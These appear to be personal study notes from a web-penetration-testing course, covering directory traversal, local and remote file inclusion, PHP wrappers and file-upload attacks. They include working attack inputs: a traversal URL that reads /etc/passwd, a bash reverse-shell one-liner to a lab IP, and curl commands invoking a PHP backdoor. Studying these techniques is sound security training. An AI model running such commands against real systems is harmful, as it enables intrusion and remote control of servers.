# Common Web Application Attacks  
**May 20, 2024**

### Common Web Application Attacks:
- Directory Traversal  
- File Inclusion Vulnerabilities  
- File Upload Attack Vulnerabilities  
- Command Injection

---

# Absolute vs Relative Paths  
**May 20, 2024**

### Absolute vs Relative Paths:
- **Absolute Path**: The full file system path with all its subdirectories. It starts with `/` (forward slash).  
  - `pwd`: Show the current path.  
  - `ls /`: List files and directories in the root file system.  
  - `../`: Go back one directory in the path.  
  - `/..`: Move up to the root directory. The number of `../` entries is relevant until we reach the root.  
  - We can use as many `../` entries as needed.

---

# Identifying and Exploiting Directory Traversals  
**May 20-22, 2024**

### Identifying Directory Traversals:
- Directory traversal allows access to sensitive files on a web server and typically occurs when the application does not properly sanitize user input.
- When a web app requests a specific page, the web server fetches the file from the file system, often stored in directories like `/var/www/html/`.  
  - Example: For a page like `home.html`, the server might serve `/var/www/html/home.html`.

### Example of Exploiting Directory Traversal:
- Consider the following URL:  
  `http://mountaindesserts.com/meteor/index.php?page=admin.php`  
  Here, the application uses PHP and a `page` parameter to display different pages. PHP uses `$_GET` to handle variables via GET requests.  
  - Directory traversal exploit:  
    `http://mountaindesserts.com/meteor/index.php?page=../../../../../../../../../etc/passwd`  
    This retrieves the `/etc/passwd` file. Typically, the web server runs under a dedicated user such as `www-data`.

---

# Windows Directory Traversals  
**May 21-22, 2024**

### Directory Traversal on Windows:
- Directory traversal on Windows is more difficult than on Linux systems.  
- Example path for testing traversal: `C:\Windows\System32\drivers\etc\hosts`.  
- Unlike Linux, Windows uses backslashes (`\`) rather than slashes (`/`). Always try both backslash and slash when testing for directory traversal vulnerabilities in web applications on Windows.

### Lab Example - Problem 2 (Windows):
- When performing path traversal in Windows, avoid including the drive letter (`C:`) in the URL.  
  - Example (incorrect usage of disk `C`):  
    `http://192.168.184.193:3000/public/plugins/alertlist/../../../../../../../../../Users/install.txt`

---

# Encoding Special Characters  
**May 22, 2024**

### Encoding Special Characters:
- Directory traversal attacks can be blocked by WAF (Web Application Firewalls) and other security mechanisms.  
- To bypass filters, we can use URL encoding, also known as percent encoding, which encodes special characters into their percent-encoded equivalents (e.g., `%20` for a space).

---

# Local File Inclusion (LFI)  
**May 22-23, 2024**

### Local File Inclusion (LFI):
- Directory traversal vulnerabilities can provide access to sensitive information.
- **LFI** allows the inclusion of local files in the application's running code. This can be exploited to achieve Remote Code Execution (RCE).
  - **Log Poisoning Example**: By injecting malicious data into the logs, we can execute code from those logs.

### Exploiting LFI with Log Poisoning:
- The `User-Agent` string is often written to log files, which can be modified to include executable code.  
- Example: Using Burp Suite to inject a PHP code snippet into the `User-Agent` request.  
  - The injected code could execute a command like `ps` to list processes.

### Reverse Shell via LFI:
- We can obtain a reverse shell by adding an SSH key to the `authorized_keys` file or by using a bash TCP reverse shell one-liner:  
  ```bash
  bash -i >& /dev/tcp/192.168.119.3/4444 0>&1


# PHP Wrappers
**Date**: May 23, 2024

PHP wrappers extend the language's capabilities, allowing access to local or remote filesystems. They can bypass filters or achieve code execution through file inclusion vulnerabilities in PHP.

- **php://filter**: Can display the contents of a file (e.g., base64 encoded).
- **data://**: Can embed plaintext or base64-encoded data, potentially leading to code execution.

**Example**:
```bash
curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,encoded_ls_command"
```

Remote File Inclusion (RFI)
Date: May 24, 2024

RFI is less common than LFI since the target system must be configured in a specific way. In PHP, for example, the allow_url_include option must be enabled for RFI to work. With RFI, a file can be included and executed from a remote source over HTTP or SMB.

Example of RFI Exploitation: Using Kali's simple-backdoor.php, we can serve it via Python:

```bash
python3 -m http.server 80
```
Exploit RFI:

```bash
curl "http://webapp.com/meter/index.php?page=http://localhost/simple-backdoor.php&cmd=ls"
```
### File Upload Vulnerabilities
Date: May 24-25, 2024

Many web applications allow users to upload files. There are two main categories of vulnerabilities:

Uploading executable files, such as PHP scripts.
Combining file upload mechanisms with other vulnerabilities (e.g., directory traversal).
Combining File Upload and Other Vulnerabilities:

Example: If the web app is vulnerable to directory traversal, we can use a relative path in the file upload request to overwrite sensitive files like authorized_keys.
We can also use this to execute malicious macros in document files, such as .docx.
Example: Using Non-Executable Files:

If the app allows non-PHP file uploads, we can modify the filename via Burp Suite to upload the file to a specific path, potentially leading to SSH access.
OS Command Injection
Date: May 25, 2024

Web applications often need to interact with the underlying operating system, especially when handling file uploads. Vulnerabilities arise when user input is not properly sanitized, allowing malicious commands to be injected and executed on the server.
